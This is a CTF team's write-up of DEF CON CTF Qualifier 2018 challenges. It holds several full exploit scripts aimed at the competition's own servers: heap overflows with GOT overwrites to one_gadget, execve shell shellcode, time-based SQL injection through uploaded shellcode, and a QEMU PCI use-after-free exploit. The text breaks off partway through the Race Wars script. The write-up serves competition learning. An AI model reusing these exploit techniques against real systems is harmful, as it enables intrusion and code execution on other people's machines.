# DEF CON CTF Qualifier 2018

Written by BFS

BFS consists of four CTF teams form Taiwan

We are Balsn, Bamboofox, DoubleSigma, KerKerYuan

 - [DEF CON CTF Qualifier 2018](#def-con-ctf-qualifier-2018)
   - [Amuse Bouche](#amuse-bouche)
     - [ELF Crumble](#elf-crumble)
     - [You Already Know - warmup](#you-already-know---warmup)
     - [Easy Pisy - crypto, web](#easy-pisy---crypto-web)
     - [babypwn1805 - pwn](#babypwn1805---pwn)
     - [sbva - Web](#sbva---web)
   - [Appetizers](#appetizers)
     - [It's-a me!](#its-a-me)
     - [shellql](#shellql)
     - [flagsifier - Reverse](#flagsifier---reverse)
         - [Behavior](#behavior)
     - [Note Oriented Programming](#note-oriented-programming)
   - [From The Grill](#from-the-grill)
     - [elastic cloud compute (memory) corruption](#elastic-cloud-compute-memory-corruption)
     - [Race Wars](#race-wars)
     - [Say Hi!](#say-hi)
   - [Guest Chefs](#guest-chefs)
     - [PHP Eval White-List](#php-eval-white-list)
     - [ghettohackers: Throwback](#ghettohackers-throwback)
     - [ddtek: Preview](#ddtek-preview)
       - [reverse](#reverse)
       - [exploit](#exploit)


\* If you want to know the solution/writeup of the problems, you can dig it out in the #irc or refer to the [official repositiries](https://github.com/o-o-overflow/).

## Amuse Bouche

### ELF Crumble
Original binary in range 0x05ad ~ 0x08d3 is filled with `X`. Search through all 8! permutation of fragments to get the flag.

### You Already Know - warmup
* Open the problem -> F12 -> Network -> Reopen the problem -> See the flag.  
```OOO{Sometimes, the answer is just staring you in the face. We have all been there}```

### Easy Pisy - crypto, web

- Service 

    * First service : Server will Recognized pdf input via OCR and sign `(by openssl_sign($data, $signature, $privkey)`, but it will reject to sign on EXECUTE command)

    * Second one : Give the signed value and pdf, this service will execute the command(extracted by ocr) if the signed verify.

- We found that this function will `sha1(data)` before signing.

Therefore, draw two command on picture,and put them into the pdf, Google released last year, to get two pdf with sha1-collision.

1. send the picutre 1 (`without EXECUTE`) to first service to `get the signature`

2. pass this signature and sha1-collision pdf ( with `EXECUTE cat<flag`) to get the flag.

[python script](https://github.com/sonickun/sha1-collider/blob/master/collider.py)

### babypwn1805 - pwn
* Overwrite the pointer of program name, and trigger `SSP` -> leak information.
* Get serveral `libc`.
* Overwite `GOT read` with `onegadget` -> with probability 1/16 (correct libc).
* `/opt/ctf/babypwn/home/flag`.
* `OOO{to_know_the_libc_you_must_become_the_libc}`
```python=
#!/usr/bin/env python
from pwn import *
import sys
import struct
import hashlib
import random
from threading import Timer

# OOO{to_know_the_libc_you_must_become_the_libc}

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1


def hit():
    cmd = 'id;LD_PRELOAD='';'
    cmd += 'cat /opt/ctf/babypwn/home/flag;'
    cmd += 'ls -al /opt/ctf/babypwn/home/;'
    cmd += 'source /opt/ctf/babypwn/flag.txt 2>&1;'
    #cmd += 'python -c \'import pty; pty.spawn("/bin/bash")\''
    y.sendline( cmd )
    print y.recv( 2048 )


host , port = 'e4771e24.quals2018.oooverflow.io' , 31337
y = remote( host , port )

y.recvuntil( ': ' )
challenge = y.recvline().strip()
y.recvuntil( ': ' )
n = int( y.recvline() )
y.sendlineafter( ':' , str( solve_pow(challenge, n) ) )

success( 'Go' )

t = 0.3
y.recvuntil( 'Go\n' )

for i in xrange( 0x10000 ):
    y.send( p64( 0xffffffffffffffc8 ) )
    p = 0xae77
    y.send( p16( p ) )
    t = Timer(1.0, hit)
    t.start()
    y.recvuntil( 'Go' , timeout=1 )
    t.cancel()
```

### sbva - Web

This is one of the easiest challenges in the comptition.

First, we are given the admin's username and password to login, but the server will return `Incompatible browser detected`. How does the server derect our browser? A quick guess is through the `User-Agent` header. So what if the header does not contain the user agent string?

``` sh
$ curl 'http://0da57cd5.quals2018.oooverflow.io/login.php' -d 'username=admin@oooverflow.io&password=admin' -H 'User-Agent:'`

<br />
<b>Notice</b>:  Undefined index: HTTP_USER_AGENT in <b>/var/www/html/browsertest.php</b> on line <b>3</b><br />

<html>
    <style scoped>
        h1 {color:red;}
        p {color:blue;} 
    </style>
    <video id="v" autoplay> </video>
    <script>
        if (navigator.battery.charging) {
            console.log("Device is charging.")
        }
    </script>
</html>
```

A PHP error occurs above, so the server actually infers our browser through the user agent header. However, there are various user-agent. It's sorts of silly to try each of them since the server might detect the version number as well.

In order to reduce possible user agent, [navigator.battery](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/battery) in javascript is an important clue. It seems that only Chrome and Firefox support this.

Let's try Firefox with different version number first. The Firefox user agent spcification is [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox), though I'm just blindly trying the possibile version number without following the specification.

```python
#!/usr/bin/env python3
# Python 3.6.5
import requests
from itertools import product

s = requests.session()                                                                                                                  
for i, j in product(range(0, 6), range(0, 51)):
    agent = f'Mozilla/{i}.0 (Windows NT 10.0; WOW64; rv:{j}.0) Gecko/20100101 Firefox/{j}.0'
    headers={'User-Agent': agent}
    r = s.post('http://0da57cd5.quals2018.oooverflow.io/login.php', data=dict(username='admin@oooverflow.io', password='admin'), headers=headers)
    print(r.text, i, j)
```

Surprisingly, we get the flag when the user agent is `Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0`.

Flag: `OOO{0ld@dm1nbr0wser1sth30nlyw@y}`



## Appetizers

### It's-a me!

* When odering pizza, Mario checks whether the pineapple Emoji Unicode (\xF0\x9F\x8D\x8D) exists for each ingridient, so we can split the Unicode into two ingridients ('\xF0\x90\xF0\x9F' and '\x8D\x8D') to bypass Mario's check
* After cooking a pizza with fake pinapple (’\xF0\x90\xF0\x9F’ and ‘\x8D\x8D’), it will trigger a heap overflow vulnerability.
* By ordering and cooking some pizzas between the ordering and cooking of the fake pinapple pizza, we can make the heap overflow overwrite the pointer to the ingredient. Since at first we don't have any addresses and the read function appends null byte at the end, we make it so that the pointer to the ingredient with LSB overflowed by 0x00 points to a heap address. Cook the pizza and we leak heap address.
* We use the same way to leak libc address, but since now we have heap address, we don't have to partial overwrite the pointer to the ingridient with null byte anymore.
* The way to hijack control flow is similar too. There is a pointer to a function pointer on each pizza cooked, which is call when they are admired. We overflow that with one_gadget.
* `OOO{cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs}`

```python
#!/usr/bin/env python2

from pwn import *
from IPython import embed
from subprocess import check_output
import re

context.arch = 'amd64'

r = remote('83b1db91.quals2018.oooverflow.io', 31337)

def PoW():
    r.recvuntil('Challenge: ')
    x = r.recvline().strip()
    r.recvuntil('n: ')
    xx = r.recvline().strip()
    x = subprocess.check_output(['./pow.py', x, xx])
    xx = re.findall('Solution: (.*) ->', x)[0]
    r.sendlineafter('Solution:', xx)

PoW()

def new(name):
    r.sendlineafter('Choice:', 'N')
    r.sendlineafter('name?', name)

def login(name):
    r.sendlineafter('Choice:', 'L')
    r.sendlineafter('name?', name)

def order(pn, ign, igs):
    r.sendlineafter('Choice:', 'O')
    r.sendlineafter('pizzas?', str(pn))
    for i in range(pn):
        r.sendlineafter('ingredients?', str(ign[i]))
        for j in range(ign[i]):
            r.sendlineafter('ingridient', flat(igs[i][j]))

def cook(decl):
    r.sendlineafter('Choice:', 'C')
    r.sendlineafter('explain', decl)

def admire():
    r.sendlineafter('Choice:', 'A')

def leave():
    r.sendlineafter('Choice:', 'L')

def please(payload):
    r.sendlineafter('Choice:', 'P')
    r.sendlineafter('yourself:', payload)

pineapple = 0x8d8d9ff0
tomato = 0x858d9ff0
chicken = 0x94909ff0
banana = 0x8c8d9ff0
poo = 0xa9929ff0

new('A')
order(1, [2], [['\xf0\x90\xf0\x9f', '\x8d\x8d']])
leave()

new('B'*0x30)
order(1, [1], [[tomato]])
leave()

login('B'*0x30)
cook('a'*290)
leave()

new('C'*0x50)
n = 4
order(1, [n], [['a'*20]*n])
leave()

login('A')
cook('a')
please('C'*32)

login('C'*0x50)
cook('a')
x = r.recvuntil('USER MENU')
xx = re.findall('BadPizza: (.*)aaaaaaaaaaaaaaaaaaaaa', x)[0]
heap = u64(xx.ljust(8, '\x00'))-0x11e30
print 'heap:', hex(heap)

# exaust heap
leave()
new('D')
order(1, [2], [['\xf0\x90\xf0\x9f', '\x8d\x8d']])
leave()
for i in range(9):
    new(chr(0x45+i))
    order(1, [1], [[tomato]])
    leave()

new('N')
order(1, [2], [['\xf0\x90\xf0\x9f', '\x8d\x8d']])
leave()

new('O'*0x30)
n = 4
order(1, [n], [['a'*16]*n])
leave()

login('M')
cook('a'*290)
leave()

login('N')
cook('a')
#raw_input("@3")
please('C'*24+flat(
    0x91,
    heap+0x132c8, 0x10,
    0x10, 0,
    heap+0x132c8,
)+'\x10')

login('O'*0x30)
cook('a')
x = r.recvuntil('USER MENU')
xx = re.findall('BadPizza: (.*)aaaaaaaaaaaaaaaaaaaaa', x)[0][:6]
libc = u64(xx.ljust(8, '\x00'))-0x3c4b78
print 'libc:', hex(libc)
system = libc+0x45390
magic = libc+0xf1147
leave()

login('D')
cook('a')
#raw_input("@2")
please(flat(
    [0]*3, 0x21,
    heap+0x138f0, 0,
    0, 0x41,
    heap+0x138f0+0x10, heap+0x13930,
    magic,
))
login('O'*0x30)
admire()

r.interactive()

```


### shellql

* We can upload our shellcode and it will be executed
* They set prctl(22, 1LL); so we can only trigger `read` `write` `exit`
* We can communicate with mysql via fd 4
* According to [this](https://dev.mysql.com/doc/internals/en/com-query.html), we can forge a correct mysql packet
* However, we cannot read from mysql
* Time to use time-based attack
`SELECT 1 from flag where (select substring(flag,1,4) from flag) = "OOO{" and SLEEP(10);`

* The exploit script:
```python
# coding: utf-8
from pwn import *
import requests
import string
import hashlib
context.arch='amd64'
def mdd5(ss):
    print ss
    a=hashlib.md5()
    a.update(ss)
    return a.hexdigest()
def run(code, timeout=1):
    s = asm(code)
    assert( '\0' not in s and len(s) < 1000)
    try:
        req = requests.post('http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php', data={
            'shell': s
        }, timeout=timeout)
    except requests.exceptions.ReadTimeout:
        print ('Timeout')
        return 1
    else:
        return 0

def qqq(payload):
    lenn=p32(len(payload)+1)[0]
    pp=lenn+'\x00\x00\x00\x03'+payload
    a=run(shellcraft.write(4, pp, len(pp)) + 'xor rax, rax;' + shellcraft.read(4, 'esp', 4) + 'inc rax; cmp rax, 1; jge .+0; ret', timeout=4)
    return a

flag=""
for i in range(70):
  for j in "y SQL"+string.printable:
    if qqq('SELECT 1 from flag where (select substring(flag,1,'+str(len(flag)+1)+') from flag) = "'+flag+j+'" and SLEEP(10);') == 1:
      flag+=j
      print flag
      break

flag2="OOO{"
for i in range(4,70):
  if qqq('SELECT 1 from flag where (select md5(substring(flag,'+str(i)+',1)) from flag) = "'+mdd5(flag[i].upper())+'" and SLEEP(10);')  == 1:
    flag2+=flag[i].upper()
  else:
    flag2+=flag[i].lower()
  print flag2


## flag is OOO{shellcode and webshell is old news, get with the times my friend!}
```

### flagsifier - Reverse
* Part 1
    ##### Behavior
    * Input is composed of 38 28x28 handwritten English characters.
    * Random combination of characters will be predicted as class 3.
    * Repeat a character 38 times will be predicted as class 14~39, which is class A~Z.
    * Using gradient ascent on input image will not produce readable picture. When we add a constraint that all 38 characters should be the same, class 14~39 can generate input with score 1, but failed on class 1~13. Implies that class 1~13 is consists of multiple characters.
    * Start with random combination of characters, we use Simulated Annealing to replace characters in input image. We can generate input image for each class with very high score. The images is not unique, but will be similar to ground truth.
    * Class 0 starts with a lot of `O` that isn't like a flag.
    * Class 1 is `OOOTHISISA.....MESSAGETOWASTEYOURTIME` which is a fake flag.
    * Class 2 starts with `OOO`.
    * Class 3~13 doesn't start with `OOO`.
    * We guessed Class 2 is true flag, so we generate a lot of possible input images to get probabilities of each character at each position.
    * Code:
    ```python
    #!/usr/bin/python3
    import sys

    dim = int(sys.argv[1])

    flag = '......................................'

    reset = False # Change to False when known part is long enough
    #  flag = 'OOOOOOOOOOOOOOOOI.....................' # dim = 0
    #  flag = 'OOOOTHISISA.....MESSAGETOWASTEYOURTIME' # dim = 1
    flag = 'OOO.............INTELLIGENCEISREQUIRED' # dim = 2


    import numpy as np
    from PIL import Image
    import os
    from tqdm import tqdm, trange
    import random
    from keras.models import load_model, Model


    model = load_model('model.h5')
    model = Model(input=model.input, output=model.layers[-2].output)

    data = [np.asarray(Image.open('sample_%d.png' % i)).reshape(28, 1064).astype(np.float) for i in range(10)]
    data = [im for d in data for im in np.split(d, 38, axis=1)]
    char = ''.join([
        'RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIUI',
        'MOLDERINGIINTELSDEDICINGCOYNESSDEFIECT',
        'AMADOFIFESINSTIIIINGGREEDIIVDISIOCATIN',
        'HAMIETSENSITIZINGNARRATIVERECAPTURINGU',
        'EIECTROENCEPHAIOGRAMSPALATECONDOIESPEN',
        'SCHWINNUFAMANAGEABLECORKSSEMICIRCIESSH',
        'BENEDICTTURGIDITYDSYCHESPHANTASMAGORIA',
        'TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW',
        'KINGFISHERCOMMONERSUERIFIESHORNETAUSTI',
        'LIQUORHEMSTITCHESRESPITEACORNSGOALREDI',
    ])
    data = list(zip(data, char))

    def softmax(x):
        """Compute softmax values for each sets of scores in x."""
        e_x = np.exp(x - np.max(x))
        return e_x / e_x.sum()


    for z in trange(100):
        if reset or z == 0:
            img, text = zip(*random.sample(data, 38))
            img = np.concatenate(img, 1).reshape(1, 28, 1064, 1)
            text = list(text)
            r = model.predict([img])[0]
            score = r[dim]
        bar = trange(1000)
        bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
        for i in bar:
            cur = img.copy()
            while True:
                idx = random.randrange(0, 38)
                im, c = random.sample(data, 1)[0]
                if text[idx] != flag[idx] or flag[idx] == c:
                    break
            cur[0,:, idx*28:(idx+1)*28,0] = im
            r = model.predict([cur])[0]
            s = r[dim]
            if ( text[idx] != flag[idx] and flag[idx] == c ) or s > score or random.random() < (100/(i+100 + z *10)) ** 4:
                text[idx] = c
                bar.desc = '%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)
                score = s
                img = cur
        tqdm.write(''.join(text))
        bar.close()
    ```
* Part 2
    * Use dictionary and trie to find all the possible sentences.
    * Dictionary: https://raw.githubusercontent.com/first20hours/google-10000-english/master/google-10000-english.txt
    * Remember to remove the useless words that length is in range 1~3.
    * Code:
        ```C++
        #include<bits/stdc++.h>
        #define f first
        #define s second
        using namespace std;
        //typedef pair<int,int>par;
        typedef pair<double,double>par;
        int nod[1000005][26],id=2;
        bool ok[1000005];
        string ans;
        vector<int>ve[38];
        void F(int nw,int now){
            if(nw==38){
                if(now==1)cout<<ans<<endl;
                return ;
            }
            for(int x:ve[nw]){
                if(!nod[now][x])continue;
                ans.push_back('A'+x);
                F(nw+1,nod[now][x]);
                if(ok[nod[now][x]]){
                    ans.push_back(' ');
                    F(nw+1,1);
                    ans.pop_back();
                }
                ans.pop_back();
            }
        }
        int main(){
            string s;
            int count=0;
            while(cin>>s){
                if(s=="0")break;
                if(++count>1000&&s.length()<=3)continue;
                int now=1;
                for(char &c:s){
                    c|=32;
                    if(!nod[now][c-'a'])
                        nod[now][c-'a']=id++;
                    now=nod[now][c-'a'];
                }
                ok[now]=1;
            }
            while(cin>>s){
                if(s=="0")break;
                for(char &c:s)
                    c|=32;
                for(int i=0;i<38;i++)
                    ve[i].push_back(s[i]-'a');
            }
            for(int i=0;i<38;i++)
                sort(ve[i].begin(),ve[i].end()),
                ve[i].resize(unique(ve[i].begin(),ve[i].end())-ve[i].begin());
            F(0,1);
            //for(int i=0;i<38;i++)
            return 0;
        }
        ```
    * input
        ```
        [The Dictionary]
        0
        OOOTOYEUUTHTNTICINTELLIGENCEISREQUIRED
        OOOTOYEGUTHTNTICINTELLIGENCEISREQUIRED
        OOOIOYCUUTUCNTICINTELLIGENCEISREQUIRED
        OOOSOYEUUCUTNTICINTELLIGENCEISREQUIRED
        OOOTOYCGLCHENTICINTELLIGENCEISREQUIRED
        OOOTOYCUUCUCNTUCINTELLIGENCEISREQUIRED
        OOOIOYEULTUTNTICINTELLIGENCEISREQUIRED
        OOOSOYCULTUCNTICINTELLIGENCEISREQUIRED
        OOOTOYEAUTUTWCICINTELLIGENCEISREQUIRED
        OOOSOYEOUTUTNTICINTELLIGENCEISREQUIRED
        OOOSOYCGHTUENTICINTELLIGENCEISREQUIRED
        OOOTOYCGLTYCNTICINTELLIGENCEISREQUIRED
        OOOTOYEUUTUTNTICINTELLIGENCEISREQUIRED
        OOOTOYEAUTUTNCICINTELLIGENCEISREQUIRED
        OOOSOYCUUTHCNTIOINTELLIGENCEISREQUIRED
        OOOSOORONTNCNTIOINTELLIGENCEISREQUIRED
        OOOSOMCSHTGCWTICINTELLIGENCEISREQUIRED
        OOOTOMEOGTSTNTITINTELLIGENCEISREQUIRED
        OOOIOOEHUTUTNTITINTELLIGENCEISREQUIRED
        OOOINOEUUTATHTICINTELLIGENCEISREQUIRED
        OOOTCMCSNSATNTICINTELLIGENCEISREQUIRED
        OOOTGWRSUTNCNTICINTELLIGENCEISREQUIRED
        OOOSOQEAUIUCWSICINTELLIGENCEISREQUIRED
        OOOTOOECHIUCNTIGINTELLIGENCEISREQUIRED
        OOOTOWEGHSOTHTIEINTELLIGENCEISREQUIRED
        OOOSOMEGNTOENTILINTELLIGENCEISREQUIRED
        OOOSCOCGNTHTNTILINTELLIGENCEISREQUIRED
        OOOSONEGNTNCNTICINTELLIGENCEISREQUIRED
        OOOSCOCYNTOTUTICINTELLIGENCEISREQUIRED
        OOOSDUEONCOTLTIOINTELLIGENCEISREQUIRED
        OOOTDUCONTNTLTIDINTELLIGENCEISREQUIRED
        OOOTCMCGNCNTNTITINTELLIGENCEISREQUIRED
        OOOTQYFGNTATNTUEINTELLIGENCEISREQUIRED
        OOOSDUECLTUTNTICINTELLIGENCEISREQUIRED
        OOOTOWCUNTUTNTILINTELIIGENCEISREOUIRED
        OOOTOMSGUTHENTICINTELLIGENCEISREOUIRED
        OOOTOUTGLTOENCUCINTELLIGENCEISREQUIRED
        OOOTOUEUUTNENTICINTELLIGENCEISREQUIRED
        OOOTOMEGUTOENCICINTELLIGENCEISREQUIRED
        OOOTONEGLTUCNTIOINTELLIGENCEISREQUIRED
        OOOTOOEANTSENTICINTELLIGENCEISREQUIRED
        OOOTOUEUUTUELIICINTELLIGENCEISREQUIRED
        OOOTOMCAUTYENCICINTELLIGENCEISREQUIRED
        OOOTOYCCNTYTWTICINTELLIGENCEISREQUIRED
        OOOTOOCANCUTNTICINTELLIGENCEISREQUIRED
        OOOTOMEINIHENTICINTELLIGENCEISREQUIRED
        OOOTOYEUNTYTNTICINTELLIGENCEISREQUIRED
        OOOTOOEUUTHCNTICINTELLIGENCEISREQUIRED
        OOOTOMCULTUTNTIOINTELLIGENCEISREQUIRED
        OOOTOMEYNTUENTICINTELLIGENCEISREQUIRED
        OOOYOMEUMTURMIJCINTELLIGENCEISREQUIRED
        OOOIDMEUMTURWYJCINTELLIGENCEISREQUIRED
        OOOLDMEUMTURWYLCINTELLIGENCEISREQUIRED
        0
        ```
    * Flag
        ```OOOSOMEAUTHENTICINTELLIGENCEISREQUIRED```
### Note Oriented Programming
* Setup the value on the stack and call sys_sigreturn
* After that, eax = 0x3 ebx=0x0 ecx=0x6060654f edx=0x4f4f4f4f cs=0x23 ss=0x2b ds=0x2b
* Now eip is 0x60606565 pointer to "int 0x80" to call sys_read
* Then, write shellcode on the 0x6060654f to get shell
```python=
from __future__ import print_function
import sys
import struct
import hashlib
from pwn import *
# inspired by C3CTF's POW

table = ['A' , 'A#' , 'B' , 'C' , 'C#' , 'D' , 'D#' , 'E' , 'F' , 'F#' , 'G' , 'G#']

def val(x):
        a = table.index(x[:-1])*1.0
        b = float(x[-1])
        return (2.0**(b+a/12.0))*27.5

		
cmd = ["F9","G0"]*0xe
cmd += ["G9","G0"]*0x40
cmd += ["A2","G0","A0","G0"]
cmd += ["G0","G0"]*0xb
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"]
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"]*0x17
cmd += ["G9","G0"]*0x6
cmd += ["A2","F8"] 
cmd += ["A0","G0"]
cmd += ["A4","A9","E0","A4","D9","E0"]
cmd += ["A0","G1"] 
cmd += ["A0","G2"] 
cmd += ["A4","A9","E0","A4","D9","E0","A2","F8"]
cmd += ["A4","A9","E0","A4","B9","E0"] 
cmd += ["A0","G3"] 
cmd += ["A4","A9","E0","A4","B9","E0"] 
cmd += ["A0","G4"] 
cmd += ["A0","G5"] 
cmd += ["A0","G6"] 
cmd += ["G9","G0"]*6
cmd += ["G0","G0"]*8 
cmd += ["G9","G0"]
cmd += ["A2","F8"]
cmd += ["A0","G0"]
cmd += ["A0","G1"] 
cmd += ["A4","A9","E0","A4","D9","E0"] 
cmd += ["A0","G2"] 
cmd += ["A0","G3"]
cmd += ["A4","A9","E0","A4","D9","E0","A2","F9","A2","F2","A4","A9","E0","A4","F9","E0"]
cmd += ["A0","G4"]
cmd += ["A2","F9","A2","F2","A4","A9","E0","A4","F9","E0","A2","F8"] 
cmd += ["G9","G0"]*4
cmd += ["G0","G0"]*0xb
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"]
cmd += ["G0","G0"] 
cmd += ["A2","F2","A4","A9","E0","A4","G9","E0"] 
cmd += ["G0","G0"]*0xc
cmd += ["F9","G0"]*0x7 
cmd += ["A2","F8","A4","A9","E0","A4","B9","E0","G2","G0"]
cmd += ["D9","G0"]*(0x70-0x1f)+["D#7"]*0x1f

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

if __name__ == '__main__':
    r = remote("4e6b5b46.quals2018.oooverflow.io",31337)
    r.recvuntil("Challenge: ")
    challenge = r.recvline()[:-1]
    r.recvuntil("n: ")
    n = int(r.recvline()[:-1])
    print('Solving challenge: "{}", n: {}'.format(challenge, n))

    solution = solve_pow(challenge, n)
    print('Solution: {} -> {}'.format(solution, pow_hash(challenge, solution)))
    r.sendlineafter("Solution:",str(solution))

    for c in cmd:
        r.send(p16(val(c)))

    r.send(p16(0x0))

    payload = "\x90"*0x18
    payload += asm("""
    mov esp,0x40404a00
    push 0x0068732f
    push 0x6e69622f
    mov eax,0xb
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    int 0x80
    """)
    r.send(payload)
    r.interactive()

```
## From The Grill

### elastic cloud compute (memory) corruption

* It will use qemu-system-x86_64 to boot a vm
* It tells us, we need to do something with PCI device
* Then I found this [writeup](https://kitctf.de/writeups/hitb2017/babyqemu)
* Now we know that we need to exploit via `/sys/devices/pci0000:00/0000:00:04.0/resource0`
* Decompile qemu-system-x86_64 and look for mmio read write function.
* I only leveraged write funtion
* There is a buffer which is located at `0x1317940` and three kinds of operations
* You can `malloc` `free` `write` some chunks. And all the chunk will be on that buffer
* I list the write function here:
```c
void __fastcall OOO_mmio_write(__int64 a1, __int64 offset, __int64 value, unsigned int a4)
{
  unsigned int v4; // eax@1
  char n[12]; // [sp+4h] [bp-3Ch]@1
  __int64 v6; // [sp+10h] [bp-30h]@1
  __int64 v7; // [sp+18h] [bp-28h]@1
  __int16 v8; // [sp+22h] [bp-1Eh]@11
  int i; // [sp+24h] [bp-1Ch]@5
  unsigned int v10; // [sp+28h] [bp-18h]@1
  unsigned int v11; // [sp+2Ch] [bp-14h]@4
  unsigned int v12; // [sp+34h] [bp-Ch]@11
  __int64 v13; // [sp+38h] [bp-8h]@1

  v7 = a1;
  v6 = offset;
  *(_QWORD *)&n[4] = value;
  v13 = a1;
  v10 = ((unsigned int)a2 & 0xF00000) >> 20;
  v4 = ((unsigned int)a2 & 0xF00000) >> 20;
  if ( v4 == 1 )
  {
    free(*(&qword_1317940 + (((unsigned int)v6 & 0xF0000) >> 16)));
  }
  else if ( v4 == 2 )
  {
    v12 = ((unsigned int)v6 & 0xF0000) >> 16;
    v8 = v6;
    memcpy((char *)*(&qword_1317940 + (signed int)v12) + (signed __int16)v6, &n[4], a4);
  }
  else if ( !v4 )
  {
    v11 = ((unsigned int)v6 & 0xF0000) >> 16;
    if ( v11 == 15 )
    {
      for ( i = 0; i <= 14; ++i )
        *(&qword_1317940 + i) = malloc(8LL * *(_QWORD *)&n[4]);
    }
    else
    {
      *(&qword_1317940 + (signed int)v11) = malloc(8LL * *(_QWORD *)&n[4]);
    }
  }
}
```
* The operation will be determined by IO offset. When your write offset is 0xabXXXX. 
* If a==1, then it will trigger free operation. 
* If a==2, then it will trigger write operation.
* Otherwise, it will trigger malloc.
* And b indicate the chunk offset on 0x1317940
* The value will be the chunk size or the value written on the chunk
* XXXX will be the offset on the chunk
* There is a UAF vulnerabilty!! You can overwrite freed chunk to launch fastbin attack.
* We can forge a fake chunk on the 0x1317940. then we can write 0x1317940. It also means that we have an arbitrary write.
* We can overwrite GOT to hijack control flow
* There is a magic function which is located at 0x6e65f9. It will triger system("cat ./flag")
* Use GOT-hijacking then you can run that magic function and get the flag
* Unfortunately we cannot upload a binary on remote vm, becasue the vm has no network connection. We can base64 encode our binary and send it to the vm. But the binary needs to be small enough, or you cannot send the whole binary because of network conditon.
* So I write some shellcode for exploit.
* The shellcode:
```nasm
section .data
    msg db      "/sys/devices/pci0000:00/0000:00:04.0/resource0"
section .text
    global _start
_start:
    mov     rax, 2
    mov     rdi, msg
    mov     rsi, 2
    mov     rdx, 0
    syscall
    mov    rdi, 0
    mov    rsi, 0x1000000
    mov    rdx, 3
    mov    r10, 1
    mov    r8, rax
    mov    r9, 0
    mov    rax,9
    syscall
    mov    rcx, rax
    mov    WORD [rax+0x20000],0xc             # malloc a chunk on 0x1317940+0x8*2
    mov    BYTE [rax+0x120000],0xc            # free the chunk on 0x1317940+0x8*2
    mov    DWORD [rax+0x220000],0x131794d     # overwrite the fd on 0x1317940+0x8*2
    mov    DWORD [rax+0x220004],0x0           #
    mov    BYTE [rax+0x10000],0xc             # malloc once
    mov    BYTE [rax+0x10000],0xc             # malloc twice , now we have a chunk at 0x131794d
    mov    DWORD [rax+0x210000],0xa0000000    # forge a fake chunk address on 0x1317960 and the address will be free got (0x11301a0)
    mov    DWORD [rax+0x210004],0x11301       #
    mov    DWORD [rax+0x240000],0x6e65f9      # Overwrite free got. The new address will trigger system("cat ./flag")
    mov    DWORD [rax+0x240004],0x0           #
    mov    DWORD [rax+0x120000],0x0           # Trigger free and get the flag !!
    mov    rax, 60
    xor    rdi, rdi
    syscall
# nasm -felf64 a.asm -o a.o && ld a.o && base64 a.out > shellcode
```
* And the code to send shellcode:
```python
import sys
import struct
import hashlib
from pwn import *

# inspired by C3CTF's POW

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

r=remote("11d9f496.quals2018.oooverflow.io",31337)
r.recvuntil("Challenge:")
cha=r.recvline().strip("\n")
r.recvuntil("n:")
n=r.recvline().strip("\n")

solution = solve_pow(cha[1:], int(n))

r.sendline(str(solution))
r.recvuntil("/ #")
f=open("shellcode")
for i in f.readlines():
  r.sendline('echo "'+i.strip('\n')+'" >> 1234')
r.sendline("base64 -d 1234 > bb")
r.sendline("chmod +x ./bb")
r.sendline("./bb")
r.interactive()
# The flag is OOO{did you know that the cloud is safe}
```


### Race Wars
1. The vulnerability exists during the program asks for tire amount; when doing so, we can apply for 0x8000000 tires to cause int overflow (0x8000000*0x20 = 0), and make the program allocate 0-size memory, but the tires struct can still be placed on heap for us to control.
2. Use transmission function to overlap the tires struct and transmission struct 
3. Use modify_tires functions to set all the attributes of tire as 0xffff
4. Use modify_transmission function to get relative address read/write capability of arbitrary memory
5. Read heap address and code GOT address to get libc address, then modify exit GOT to one_gadget, call exit, and get shell
* code:
```python=
from pwn import *
import sys
import time
import random
host = '2f76febe.quals2018.oooverflow.io'
port = 31337

binary = "./racewars"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def new():
  pass

def edit():
  pass

def remove():
  pass

def show(start,end):
  pass
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = remote("127.0.0.1" ,4444)

else:
  r = remote(host ,port)
  r.recvuntil("Challenge: ")
  Challenge = r.recvuntil("\n")[:-1]
  r.recvuntil("n:")
  n = r.recvuntil("\n")[:-1]
  r.recvuntil("Solution:")
  p = process(["/usr/bin/python", "./pow.py",Challenge ,n ])
  print "pow..."
  p.recvuntil("Solution: ")
  ans = p.recvuntil(" ")[:-1]
  r.sendline(ans)

def tires(num):
  r.recvuntil("E: ")
  r.sendline("1")
  r.recvuntil("?\n")
  r.sendline(str(num))

def chassis(option):
  r.recvuntil("E: ")
